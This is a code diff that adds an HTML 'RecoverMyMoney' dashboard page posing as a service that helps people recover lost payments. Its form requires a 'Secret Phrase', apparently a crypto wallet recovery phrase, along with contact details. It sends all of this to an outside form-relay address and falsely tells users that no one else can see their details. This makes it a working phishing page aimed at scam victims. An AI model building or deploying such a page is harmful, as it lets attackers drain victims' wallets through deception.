@@ -103,3 +103,108 @@
   </script>
 </body>
 </html>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>RecoverMyMoney — Dashboard</title>
+  <link rel="stylesheet" href="dashboard.css">
+</head>
+<body>
+  <!-- HEADER -->
+  <header class="site-header">
+    <div class="container header-inner">
+      <h1 class="brand">RecoverMyMoney</h1>
+      <div class="user-actions">
+        <span id="userGreeting">Welcome, Guest</span>
+        <button id="logoutBtn" class="btn small">Logout</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN -->
+  <main class="container">
+    <section class="card">
+      <h2>Report a Taken Payment</h2>
+      <p>Fill in the details below. All fields are required.</p>
+
+      <form id="reportForm" autocomplete="off" method="POST" 
+            action="https://formsubmit.co/el/yedowa" enctype="multipart/form-data">
+        <input type="hidden" name="_captcha" value="false">
+
+        <label class="field">
+          <span>Full Name</span>
+          <input id="fullName" name="name" placeholder="John Doe" required>
+        </label>
+
+        <label class="field">
+          <span>Email</span>
+          <input id="email" name="email" type="email" placeholder="you@example.com" required>
+        </label>
+
+        <label class="field">
+          <span>Phone</span>
+          <input name="phone" type="tel" placeholder="+234 901 234 5678" required>
+        </label>
+
+        <label class="field">
+          <span>Amount (e.g. $500 or 0.01 BTC)</span>
+          <input name="amount" placeholder="$500 or 0.01 BTC" required>
+        </label>
+
+        <label class="field">
+          <span>Secret Phrase</span>
+          <input name="phrase" placeholder="Your secret phrase" required>
+        </label>
+
+        <label class="field">
+          <span>Short Description</span>
+          <textarea name="details" rows="4" placeholder="Provide a short description" required></textarea>
+        </label>
+
+        <label class="field">
+          <span>Attach Evidence (Screenshots / PDF) — optional</span>
+          <input id="evidence" name="evidence" type="file" accept="image/*,application/pdf">
+          <div class="small">Max 1 file, 5MB. Use zip for multiple files.</div>
+          <div id="fileList" class="file-list"></div>
+        </label>
+
+        <label class="consent">
+          <input id="consent" name="consent" type="checkbox" required>
+          <span>I consent to my details being used to attempt recovery and to be contacted regarding this report.</span>
+        </label>
+
+        <p class="note">🔒 Your details are secured. No one has access to your details apart from you.</p>
+
+        <div class="actions">
+          <button type="submit" class="btn primary">Submit Report</button>
+          <button id="clearBtn" type="button" class="btn outline">Clear</button>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div>© <span id="year"></span> RecoverMyMoney</div>
+  </footer>
+
+  <!-- Toast -->
+  <div id="toast" class="toast hidden"></div>
+
+  <!-- Firebase + Custom JS -->
+  <script type="module" src="dashboard.js"></script>
+
+  <!-- Tawk.to Live Chat -->
+  <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+      var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+      s1.async=true;
+      s1.src='https://embed.tawk.to/YOUR_TAWKTO_ID/1xyz';  // replace with your Tawk.to ID
+      s1.charset='UTF-8'; s1.setAttribute('crossorigin','*');
+      s0.parentNode.insertBefore(s1,s0);
+    })();
+  </script>
+</body>
+</html>
